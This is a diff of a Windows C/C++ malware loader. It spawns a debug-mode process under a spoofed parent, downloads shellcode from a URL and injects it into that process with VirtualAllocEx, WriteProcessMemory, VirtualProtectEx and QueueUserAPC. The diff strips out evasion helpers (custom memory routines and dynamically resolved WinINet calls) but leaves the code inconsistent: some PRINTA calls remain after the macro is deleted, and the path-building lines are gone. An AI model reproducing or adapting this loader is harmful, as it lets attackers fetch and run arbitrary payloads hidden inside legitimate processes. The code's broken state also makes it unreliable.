@@ -2,58 +2,8 @@
 #include <wininet.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-#include "includes/memcpy.h"
-#include "includes/memset.h"
-#include "includes/strcpy.h"
-#include "includes/strcat.h"
-#include "includes/strlen.h"
-//#include "includes/ZeroMemoryEx.h"
-#include "includes/Wininet_Structs.h"
 
 #pragma comment (lib, "Wininet.lib")
-#pragma comment (lib, "User32.lib")
-
-InOpenW pInOpenW = reinterpret_cast<InOpenW>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetOpenW"));
-InOpUrlW pInOpUrlW = reinterpret_cast<InOpUrlW>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetOpenUrlW"));
-InReadFile pInReadFile = reinterpret_cast<InReadFile>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetReadFile"));
-InSetOpt pInSetOpt = reinterpret_cast<InSetOpt>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetSetOptionW"));
-InClH pInClH = reinterpret_cast<InClH>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetCloseHandle"));
-
-#define PRINTA( STR, ... )                                                                  \
-    if (1) {                                                                                \
-        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
-        if ( buf != NULL ) {                                                                \
-            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
-            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
-            HeapFree( GetProcessHeap(), 0, buf );                                           \
-        }                                                                                   \
-    }  
-
-VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size)
-{
-	PULONG Dest = (PULONG)Destination;
-	SIZE_T Count = Size / sizeof(ULONG);
-
-	while (Count > 0)
-	{
-		*Dest = 0;
-		Dest++;
-		Count--;
-	}
-
-	return;
-}
-
-void* __cdecl memcp(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
-{
-	PBYTE D = (PBYTE)Destination;
-	PBYTE S = (PBYTE)Source;
-
-	while (Length--)
-		*D++ = *S++;
-
-	return Destination;
-}
 
 BOOL GetRemoteProcessHandle(IN DWORD dwProcessId, OUT HANDLE* hProcess) {
 	PROCESSENTRY32 Proc = {};
@@ -110,20 +60,18 @@ BOOL CreateDebugProcess(IN const char* lpProcessName, IN HANDLE hParentProcess, 
 	SIEx.StartupInfo.cb = sizeof(STARTUPINFO);
 
     if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
-		PRINTA("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
         return FALSE;
     }
 
 	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
 
-	// Allocating enough memory
 	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
 	if (pThreadAttList == NULL) {
 		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
 	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
 		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -134,25 +82,17 @@ BOOL CreateDebugProcess(IN const char* lpProcessName, IN HANDLE hParentProcess, 
 		return FALSE;
 	}
 
-	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
-	// created using UpdateProcThreadAttribute - that is the parent process
 	SIEx.lpAttributeList = pThreadAttList;
-
-
+	
     //sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 	
 	char n_lpPath[MAX_PATH];
 
-	strcpyA(n_lpPath, lpPath);
-	strcatA(n_lpPath, WnDr);
-	strcatA(n_lpPath, "\\System32\\");
-	strcatA(n_lpPath, lpProcessName);
-	
-	PRINTA("\n[i] Running : \"%s\" ... \n", lpPath);
+	printf("\n[i] Running : \"%s\" ... \n", lpPath);
 
 
     if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS, NULL, NULL, &SIEx.StartupInfo, &PI)) {
-		PRINTA("[!] CreateProcess with Error : %d\n", GetLastError());
+		printf("[!] CreateProcess with Error : %d\n", GetLastError());
         return FALSE;
     };
 
@@ -185,14 +125,13 @@ BOOL GetBytesFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) 
 
 	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
 	if (hInternet == NULL) {
-		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
-	PRINTA("MARK...\n");
 	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	if (hInternetFile == NULL) {
-		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
@@ -204,8 +143,8 @@ BOOL GetBytesFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) 
 
 	while (TRUE) {
 		
-		if (!pInReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
-			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
 			bSTATE = FALSE; goto _EndOfFunction;
 		}
 
@@ -219,7 +158,7 @@ BOOL GetBytesFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) 
 		if (pBytes == NULL) {
 			bSTATE = FALSE; goto _EndOfFunction;
 		}
-		memcp((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
 		memset(pTmpBytes, '\0', dwBytesRead);
 
 		if (dwBytesRead < 1024) {
@@ -252,23 +191,23 @@ BOOL InjectShellcode(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfS
 
 	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (*ppAddress == NULL) {
-		PRINTA("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	PRINTA("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);
+	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);
 
 
-	PRINTA("\t[#] Press <Enter> To Write Payload ... ");
+	printf("\t[#] Press <Enter> To Write Payload ... ");
 	
 	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
-		PRINTA("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	PRINTA("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
+	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
 
 	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		PRINTA("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
+		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -304,32 +243,32 @@ int main(){
 		PRINTA("CreateDebugProcess Failed with Error: %d\n", GetLastError());
 		return 1;
 	};
-	PRINTA("\n\t[i] Target Process Created With Pid : %d \n", dwProcessID);
+	printf("\n\t[i] Target Process Created With Pid : %d \n", dwProcessID);
 
-	PRINTA("\t[i] Getting Shellcode From Url...\n");
+	printf("\t[i] Getting Shellcode From Url...\n");
 	if (!GetBytesFromUrl(Url, &pPayloadBytes, &sPayloadSize)) {
-		PRINTA("GetBytesFromUrl Failed With Error: %d\n", GetLastError());
+		printf("GetBytesFromUrl Failed With Error: %d\n", GetLastError());
 		return 1;
 	}
 	
-	PRINTA("\t[i] Writing Shellcode To The Target Process ... \n");
+	printf("\t[i] Writing Shellcode To The Target Process ... \n");
 	
 	if (!InjectShellcode(hProcess, pPayloadBytes, sPayloadSize, &pAddress)) {
-		PRINTA("InjectShellcode Failed With Error: %d \n", GetLastError());
+		printf("InjectShellcode Failed With Error: %d \n", GetLastError());
 		return 1;
 	}
-	PRINTA("[+] DONE \n\n");
+	printf("[+] DONE \n\n");
 	getchar();
 	QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
 
 
 	PRINTA("[#] Press <Enter> To Run Shellcode ... ");
 	
-	PRINTA("[i] Detaching The Target Process ... ");
+	printf("[i] Detaching The Target Process ... ");
 	DebugActiveProcessStop(dwProcessID);
-	PRINTA("[+] DONE \n\n");
+	printf("[+] DONE \n\n");
 
-	PRINTA("[#] Press <Enter> To Quit ... ");
+	printf("[#] Press <Enter> To Quit ... ");
 	
 	CloseHandle(hProcess);
 	CloseHandle(hThread);
